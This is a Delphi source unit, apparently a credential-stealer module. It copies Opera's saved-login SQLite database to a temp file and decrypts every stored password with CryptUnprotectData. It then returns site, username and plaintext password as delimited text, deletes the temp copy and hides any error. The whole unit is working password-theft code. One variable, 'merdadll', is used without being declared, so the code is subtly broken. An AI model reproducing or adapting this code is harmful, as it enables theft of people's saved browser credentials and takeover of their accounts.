unit UnitOperaPasswords;

interface

uses
  Windows, SysUtils, Classes, SQLite3, SQLiteTable3, ShlObj, ShFolder;
                                    
function ListOperaPasswords(Sqlite3Path: string): string;

implementation
       
type
  TCharArray = Array[0..1023] Of Char;
  _TOKEN_USER = record
    User: SID_AND_ATTRIBUTES;
  end;
  TOKEN_USER = _TOKEN_USER;
  TTokenUser = TOKEN_USER;
  PTokenUser = ^TOKEN_USER;
  _CREDENTIAL_ATTRIBUTEA = record
    Keyword: LPSTR;
    Flags: DWORD;
    ValueSize: DWORD;
    Value: PBYTE;
  end;
  PCREDENTIAL_ATTRIBUTE = ^_CREDENTIAL_ATTRIBUTEA;
  _CREDENTIALA = record
    Flags: DWORD;
    Type_: DWORD;
    TargetName: LPSTR;
    Comment: LPSTR;
    LastWritten: FILETIME;
    CredentialBlobSize: DWORD;
    CredentialBlob: PBYTE;
    Persist: DWORD;
    AttributeCount: DWORD;
    Attributes: PCREDENTIAL_ATTRIBUTE;
    TargetAlias: LPSTR;
    UserName: LPSTR;
  end;
  PCREDENTIAL = array of ^_CREDENTIALA;
  _CRYPTPROTECT_PROMPTSTRUCT = record
    cbSize: DWORD;
    dwPromptFlags: DWORD;
    hwndApp: HWND;
    szPrompt: LPCWSTR;
  end;
  PCRYPTPROTECT_PROMPTSTRUCT = ^_CRYPTPROTECT_PROMPTSTRUCT;
  _CRYPTOAPI_BLOB = record
    cbData: DWORD;
    pbData: PBYTE;
  end;
  DATA_BLOB = _CRYPTOAPI_BLOB;
  PDATA_BLOB = ^DATA_BLOB;

function CryptUnprotectData(pDataIn: PDATA_BLOB; ppszDataDescr: PLPWSTR; pOptionalEntropy: PDATA_BLOB; pvReserved: Pointer; pPromptStruct: PCRYPTPROTECT_PROMPTSTRUCT; dwFlags: DWORD; pDataOut: PDATA_BLOB): BOOL; stdcall; external 'crypt32.dll' Name 'CryptUnprotectData';
    
function TmpDir: string; var DataSize: byte;
begin
  SetLength(Result, MAX_PATH);
  DataSize := GetTempPath(MAX_PATH, PChar(Result));
  if DataSize <> 0 then
  begin
    SetLength(Result, DataSize);
    if Result[Length(Result)] <> '\' then Result := Result + '\';
  end;
end;
                    
function GetAppData: string; var RecPath: array[0..255] of char;
begin
  Result := '';
  if SHGetSpecialFolderPath(0,RecPath,CSIDL_LOCAL_APPDATA,false) then
  begin
    Result := RecPath;
    if Result[Length(Result)] <> '\' then Result := Result + '\';
  end;
end;

function GetOperaPass(Sqlite3Path: string): string;
var
  DB: TSQLiteDatabase;
  Tablo: TSQLiteTable;
  Sifre: string;
  Giren: DATA_BLOB;
  Cikan: DATA_BLOB;
  DataStream: TMemorystream;
  Arquivo, TempFile: string;
begin
  result := '';
  merdadll := Sqlite3Path;
  Arquivo := GetAppData + 'Opera Software\Opera Stable\Login Data'; 
  TempFile := TmpDir + inttostr(gettickcount) + '.tmp';
  if CopyFile(pchar(arquivo), pchar(TempFile), false) = false then exit;

  db := TSQLiteDatabase.Create(TempFile);
  tablo := DB.GetTable('SELECT * FROM logins');
  While not tablo.EOF do
  begin
    DataStream := TMemoryStream.Create;
    DataStream := tablo.FieldAsBlob(tablo.FieldIndex['password_value']);
    Giren.pbData := DataStream.Memory;
    Giren.cbData := DataStream.Size;
    CryptUnProtectData(@Giren, nil,nil,nil,nil,0,@Cikan);
    SetString(sifre, PAnsiChar(Cikan.pbData), Cikan.cbData);

    Result := Result + 'Opera Browser' + '|';
    Result := Result + tablo.FieldAsString(tablo.FieldIndex['origin_url']) + '|';
    Result := Result + tablo.FieldAsString(tablo.FieldIndex['username_value']) + '|';
    Result := Result + sifre + '|' + #13#10;
    Tablo.Next;
  end;
  DeleteFile(pchar(TempFile));
end;

function ListOperaPasswords(Sqlite3Path: string): string;
begin
  Result := '';
  try Result := GetOperaPass(Sqlite3Path); except end;
end;

end.
